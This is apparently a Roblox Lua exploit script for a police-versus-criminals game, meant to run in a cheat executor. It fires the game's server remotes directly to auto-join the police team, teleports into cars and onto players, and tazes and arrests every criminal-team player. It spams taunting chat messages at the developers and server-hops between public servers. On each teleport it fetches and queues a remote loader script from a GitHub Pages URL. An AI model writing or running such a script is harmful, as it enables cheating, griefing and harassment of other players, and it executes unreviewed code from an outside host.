--[[
	Made by IAteYourDog
	Everything else was made by IAteYourDog
]]
local messages = {
	"Lol this game has no security",
	"Probably the easiest script I've ever made tbh",
	"Imagine not having good anti-exploit",
	"Don't like what I'm doing? Thank the devs",
	"Lol, this took less than an hour to make",
	"IAteYourDog car4864 is pretty cool tbh",
	"Do the devs know what anti exploit is?",
	"Good luck fixing this lol",
	"I remember when it was actually hard to exploit a game",
	"Aww, you thought banning 1 out of 600 accounts would do a thing?",
	"Hi devs, if you see this message. Make your game better lol",
	"I thought you 'patched' my script?",
	"I love seeing watching this game die tbh"
}

print("Loading")

if not game:IsLoaded() then
	game.Loaded:Wait()
end

repeat 
	wait() 
	for _,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.HUD.TeamScreen.PoliceBG.MouseButton1Click)) do
		v:Fire()
	end
until game:GetService("Players").LocalPlayer.PlayerGui.HUD.TeamScreen.Visible == false and game:GetService("Players").LocalPlayer.Character ~= nil

print("Past loading screen")

local function leave()
	game:GetService("ReplicatedStorage").Events.ExitVehicle:FireServer()
end

local function enterCar(car)
	local args = {
		[1] = "EnterVehicle",
		[2] = car
	}

	game:GetService("ReplicatedStorage").NetworkEvents.EventIndex7:FireServer(unpack(args))
	wait(0.3)
end

local function arrest(plr)
	local args = {
		[1] = "ContextCallback",
		[2] = "ArrestPlayer",
		[3] = plr,
		[4] = true
	}

	game:GetService("ReplicatedStorage").NetworkEvents.EventIndex6:FireServer(unpack(args))
end

local function taze(plr)
	local args = {
		[1] = plr.Position,
		[2] = plr.Position,
		[3] = plr
	}

	game:GetService("ReplicatedStorage").Events.CreateTaserProjectile:FireServer(unpack(args))
end

local function go(plr)
	--DEBUG
	local vehicle
	for i,v in pairs(game.Workspace.Vehicles:GetDescendants()) do 
		if v.Name == "Caddie" and v.Seats:FindFirstChild("Driver") and v.Seats.Driver.Occupant == nil then
			if v.Seats.Driver:FindFirstChild("VehicleNameTag") then
				if v.Seats.Driver.VehicleNameTag.Username.Text == "UseStarCode_BACON" or v.Seats.Driver.VehicleNameTag.Username.Text == "" then
					print("car car")
					vehicle = v.Seats.Driver
				end
			end
		end
	end

	local target = plr
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = vehicle.CFrame + Vector3.new(0,3,0)
	game.Players.LocalPlayer.Character.Humanoid:ChangeState(10)
	enterCar(vehicle)
	vehicle.Parent.Parent:SetPrimaryPartCFrame(target.CFrame + Vector3.new(0,3,0))

	wait(0.5)
end

local function chat()
	local randomMsg = messages[math.random(1,#messages)]
	local args = {
		[1] = randomMsg,
		[2] = "All"
	}

	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end

local function sererHop()
	print("Work in progress")
	game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
		if State == Enum.TeleportState.Started then
			syn.queue_on_teleport(game:HttpGet("https://elliotdoescode.github.io/skid/load.lua"))
		end
	end)
end

spawn(function()
	while wait(3) do
		chat()
	end
end)

for _,v in pairs(game:GetService("Players"):GetPlayers()) do
	pcall(function()
		if v.Team and v.Team.Name == "Criminals" then
			local function repeatFunc()
				local target = v.Character.UpperTorso
				go(target)
				wait()
				if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
					if (target.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude < 20 then
						for count = 1, 3 do
							leave()
						end
						taze(target.Parent.Head)
						wait(0.4)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.CFrame + Vector3.new(0,3,0)
						wait(0.4)
						arrest(target)
					else
						repeatFunc()
					end
				end
				wait(2.4)
			end
			repeatFunc()
		end
	end)
end

sererHop()
while wait() do
	pcall(function()
		local x = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId and v.playing > 16 then
				x[#x + 1] = v.id
			end
		end
		if #x > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
		end
	end)
end
